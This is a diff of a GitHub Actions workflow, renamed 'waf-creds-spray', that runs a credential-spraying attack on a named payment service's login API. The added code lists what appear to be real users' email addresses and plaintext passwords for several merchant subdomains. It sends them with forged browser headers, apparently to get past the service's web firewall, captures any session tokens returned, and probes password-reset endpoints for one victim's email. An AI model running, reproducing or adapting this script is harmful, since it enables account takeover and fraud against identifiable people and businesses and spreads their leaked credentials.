@@ -1,60 +1,73 @@
-name: waf-login-v4
+name: waf-creds-spray
 on:
   workflow_dispatch:
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-    - name: Full login test with all browser headers
+    - name: Credential spray on wpdataservice
       run: |
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
         
-        echo "=== IP ==="
-        curl -s https://api.ipify.org && echo
+        echo "IP: $(curl -s https://api.ipify.org)"
         
         echo ""
-        echo "=== Obter cookies com GET primeiro ==="
-        curl -v -m 15 -c /tmp/cookies.txt \
-          -A "$UA" \
-          -H "Accept: application/json, text/plain, */*" \
-          -H "Accept-Language: pt-BR,pt;q=0.9" \
-          -H "Accept-Encoding: gzip, deflate, br" \
-          -H "type-application: web" \
-          "$BASE/users/theme" 2>&1 | grep -E "(< |Set-Cookie|200|403)"
+        echo "=== SPRAY DE CREDENCIAIS ==="
+        
+        # portal.wisepay.com.br users
+        CREDS=(
+          "icelaserbelem@gmail.com:ICELASER2021:https://portal.wisepay.com.br"
+          "lenildo.silva@outlook.com:Rede@4321:https://portal.wisepay.com.br"
+          "fabiane@petcenterbrasil.com.br:08710871:https://petcenterbrasil.wisepay.com.br"
+          "fabiane@petcenterbrasil.com.br:67896789:https://petcenterbrasil.wisepay.com.br"
+          "marco@vanityestetica.com.br:12341234:https://marcoantonio.wisepay.com.br"
+          "andrejunior1223@gmail.com:12341234:https://donbarony.wisepay.com.br"
+          "contato@deepfit.com.br:12341234:https://deepfit.wisepay.com.br"
+          "acaiacafinanceiro@gmail.com:13467913:https://acaiaca.wisepay.com.br"
+        )
+        
+        for CRED in "${CREDS[@]}"; do
+          EMAIL="${CRED%%:*}"
+          REST="${CRED#*:}"
+          PASS="${REST%%:*}"
+          ORIGIN="${REST#*:}"
+          
+          RESP=$(curl -s -m 15 \
+            -A "$UA" \
+            -H "Content-Type: application/json" \
+            -H "Origin: $ORIGIN" \
+            -H "Referer: $ORIGIN/login" \
+            -H "Sec-Fetch-Site: same-site" \
+            -H "Sec-Fetch-Mode: cors" \
+            -H "Sec-Fetch-Dest: empty" \
+            -H "type-application: web" \
+            -X POST "$BASE/login" \
+            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
+            -w "\n%{http_code}")
+          
+          HTTP_CODE=$(echo "$RESP" | tail -1)
+          BODY=$(echo "$RESP" | head -1)
+          
+          if [ "$HTTP_CODE" = "200" ]; then
+            TOKEN=$(echo "$BODY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('data',{}).get('wisepay-token','NO_TOKEN'))" 2>/dev/null)
+            echo "SUCCESS: $EMAIL | TOKEN: $TOKEN | ORIGIN: $ORIGIN"
+          else
+            MSG=$(echo "$BODY" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('message','?'))" 2>/dev/null || echo "$BODY" | head -c 100)
+            echo "FAIL $HTTP_CODE: $EMAIL:$PASS | $MSG"
+          fi
+          sleep 0.5
+        done
         
         echo ""
-        echo "=== POST /login com TODOS os headers Sec + cookies ==="
-        curl -v -m 20 \
-          -b /tmp/cookies.txt \
-          -A "$UA" \
-          -H "Accept: application/json, text/plain, */*" \
-          -H "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7" \
-          -H "Accept-Encoding: gzip, deflate, br" \
-          -H "Content-Type: application/json" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -H "Referer: https://portal.wisepay.com.br/login" \
-          -H "Sec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"" \
-          -H "Sec-Ch-Ua-Mobile: ?0" \
-          -H "Sec-Ch-Ua-Platform: \"Windows\"" \
-          -H "Sec-Fetch-Dest: empty" \
-          -H "Sec-Fetch-Mode: cors" \
-          -H "Sec-Fetch-Site: same-site" \
-          -H "type-application: web" \
-          -H "Connection: keep-alive" \
-          -X POST "$BASE/login" \
-          -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}' \
-          -w "\nSTATUS:%{http_code}" 2>&1
-        
-        echo ""
-        echo "=== POST com lenildo.silva (Rede@4321) ==="
-        curl -s -m 15 \
-          -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -H "Referer: https://portal.wisepay.com.br/login" \
-          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
-          -H "type-application: web" \
-          -X POST "$BASE/login" \
-          -d '{"email":"lenildo.silva@outlook.com","password":"Rede@4321"}' \
-          -w "\nHTTP:%{http_code}"
+        echo "=== RESET PASSWORD (admin/reset sem 2FA) ==="
+        # Testar reset de senha sem auth (P0-1 do mapa)
+        for path in /login/password-recover /api/reset-password /users/reset-password; do
+          CODE=$(curl -s -m 10 -A "$UA" \
+            -H "Content-Type: application/json" \
+            -H "type-application: web" \
+            -X POST "$BASE$path" \
+            -d '{"email":"icelaserbelem@gmail.com"}' \
+            -w "%{http_code}" -o /dev/null)
+          echo "POST $path -> $CODE"
+        done
